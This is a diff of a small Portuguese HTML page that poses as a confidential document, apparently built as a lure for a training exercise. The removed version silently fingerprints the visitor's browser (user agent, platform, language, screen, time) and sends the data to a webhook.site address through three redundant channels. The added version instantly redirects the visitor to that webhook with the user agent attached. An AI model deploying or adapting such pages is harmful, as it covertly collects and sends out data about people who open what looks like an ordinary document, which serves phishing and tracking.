@@ -1,56 +1,14 @@
 <!DOCTYPE html>
-<html lang="pt">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Documento Confidencial</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            padding: 20px;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-        h1 { color: #333; }
-    </style>
+    <meta http-equiv="refresh" content="0;url=https://webhook.site/ac1086cb-c4a5-4c1a-a9fa-52b8ba15836d">
+    <title>Carregando...</title>
 </head>
 <body>
-    <h1>📄 Documento Importante</h1>
-    <p>Este é um documento de teste para o treinamento.</p>
-    <p id="status">Carregando informações...</p>
-
+    <p>Redirecionando...</p>
     <script>
-        // Coleta informações
-        const info = {
-            ua: navigator.userAgent,
-            platform: navigator.platform,
-            lang: navigator.language,
-            screen: screen.width + 'x' + screen.height,
-            time: new Date().toISOString()
-        };
-
-        // COLE SUA URL DO WEBHOOK AQUI
-        const webhookURL = 'https://webhook.site/ac1086cb-c4a5-4c1a-a9fa-52b8ba15836d';
-
-        // Método 1: Fetch com modo no-cors
-        fetch(webhookURL + '?' + new URLSearchParams(info), {
-            method: 'GET',
-            mode: 'no-cors'
-        }).catch(e => console.log(e));
-
-        // Método 2: Imagem invisível (backup)
-        const img = new Image();
-        img.src = webhookURL + '?' + new URLSearchParams(info);
-
-        // Método 3: XMLHttpRequest (backup)
-        const xhr = new XMLHttpRequest();
-        xhr.open('GET', webhookURL + '?' + new URLSearchParams(info), true);
-        xhr.send();
-
-        // Atualiza status
-        setTimeout(() => {
-            document.getElementById('status').innerHTML = '✓ Documento carregado!<br><small>Dispositivo: ' + navigator.userAgent + '</small>';
-        }, 1000);
+        window.location.href = 'https://webhook.site/ac1086cb-c4a5-4c1a-a9fa-52b8ba15836d?device=' + encodeURIComponent(navigator.userAgent);
     </script>
 </body>
 </html>
